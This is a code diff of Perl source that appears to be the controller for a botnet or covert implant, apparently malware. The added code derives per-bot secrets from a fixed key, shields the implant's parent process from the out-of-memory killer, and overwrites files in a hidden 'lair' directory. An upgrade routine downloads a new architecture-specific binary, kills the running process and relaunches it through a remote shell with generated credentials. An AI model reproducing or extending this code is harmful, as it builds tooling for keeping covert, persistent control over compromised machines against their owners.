@@ -63,6 +63,16 @@ my $KEY_TYPE  = pack "H*", "not-the-real-secret";
 # 2 - tnr upgraded
 # 3 - tncmd
 
+sub gensecret($)
+{
+	my ($id) = @_;
+
+	$id = Digest::SHA3::sha3_256 $id . $KEY_FIXED;
+	$id = Digest::SHA3::sha3_256 $KEY_FIXED . $id;
+
+	$id
+}
+
 sub gencreds(;$)
 {
 	my ($type) = @_;
@@ -73,14 +83,8 @@ sub gencreds(;$)
 	while () {
 		my $id = $id0 ^ pack "N", $c;
 
-		if ($type == ord Digest::SHA3::sha3_256 $id . $KEY_TYPE) {
-			my $secret = $id;
-
-			$secret = Digest::SHA3::sha3_256 $secret . $KEY_FIXED;
-			$secret = Digest::SHA3::sha3_256 $KEY_FIXED . $secret;
-
-			return ($id, $secret);
-		}
+		return ($id, gensecret $id)
+			if $type == ord Digest::SHA3::sha3_256 $id . $KEY_TYPE;
 
 		++$c;
 	}
@@ -185,21 +189,20 @@ sub _new
 		};
 	}
 
-	$self->read_file_(
-		"/proc/self/stat",
+	$self->tn_pid_(
 		sub {
-			if ($_[0] =~ /^\d+ \(.*?\) . (\d+)/) {
-				my $ppid = $1;
+			my ($pid) = @_;
 
-				async_pool {
-					$self->write_file("/proc/$ppid/oom_adj",       "-17");
-					$self->write_file("/proc/$ppid/oom_score_adj", "-1000");
-				};
-			}
+			async_pool {
+				$self->write_file("/proc/$pid/oom_adj",       "-17");
+				$self->write_file("/proc/$pid/oom_score_adj", "-1000");
+			};
 		});
 
-	$self->write_file("/proc/self/oom_adj",       "0");
-	$self->write_file("/proc/self/oom_score_adj", "0");
+	async_pool {
+		$self->write_file("/proc/self/oom_adj",       "0");
+		$self->write_file("/proc/self/oom_score_adj", "0");
+	};
 
 	$self
 }
@@ -723,6 +726,34 @@ sub rsh_
 }
 
 ####################################################################################
+# find pid of tn server (parent pid)
+sub tn_pid_
+{
+	my ($self, $cb) = @_;
+
+	$self->read_file_(
+		"/proc/self/stat",
+		sub {
+			$cb->($_[0] =~ /^\d+ \(.*?\) . (\d+)/ ? $1 : undef);
+		});
+}
+
+sub replace_file
+{
+	my ($self, $path, $file) = @_;
+
+	$self->unlink("${path}x");
+	$self->open("${path}x", 1);
+	$self->write($file->{data});
+	$self->close;
+	$self->chmod($file->{perm}, "${path}x");
+
+	# TODO: verify
+	$self->rename("${path}x", $path);
+
+	1
+}
+
 sub send_file_
 {
 	my ($self, $file, $dst, $cb) = @_;
@@ -795,6 +826,7 @@ sub dl_
 	$self->close;
 }
 
+# download a file, returns 2 if the file did not need updating
 sub dl_file_
 {
 	my ($self, $file, $dst, $cb) = @_;
@@ -807,7 +839,7 @@ sub dl_file_
 		sub {
 			if ($file->{fnv} eq $_[0]) {
 				$self->chmod($file->{perm}, $dst);
-				$cb->(1);
+				$cb->(2);
 			} else {
 				my $dstx = $dst . "x";
 
@@ -1019,6 +1051,38 @@ sub write_cfg_
 	$cb->(1);
 }
 
+sub upgrade_tn
+{
+	my ($self) = @_;
+
+	return 0
+		if $self->{version} >= bm::sql::getenv "mintn";
+
+	my $lair  = $self->lair;
+	my $tnpid = $self->tn_pid;
+
+	my $tn = bm::file::load "arch/$_[0]{arch}/tn";
+
+	unless ($self->dl_file($tn, "$lair/.net_tn")) {
+		$self->replace_file("$lair/.net_tn", $tn);
+	}
+
+	my $creds = format_credarg $self->{id}, gensecret $self->{id}, $self->{port};
+
+	#  my $out = $self->rsh ("\Q$lair\E/.net_tnx $creds 2>&1");
+	#	my $out = $self->rsh ("echo hi");
+	#	use Data::Dump; ddx $out;
+	#	printf "RET=%x\n", $self->ret;
+	#	$self->ping;
+	$self->kill(9, $tnpid);
+	$self->rsh("\Q$lair\E/.net_tn $creds");
+
+	$self->ping;
+
+	warn "$tnpid id $lair $creds\n";
+}
+
+# upgrade bn
 sub upgrade
 {
 	my ($self) = @_;
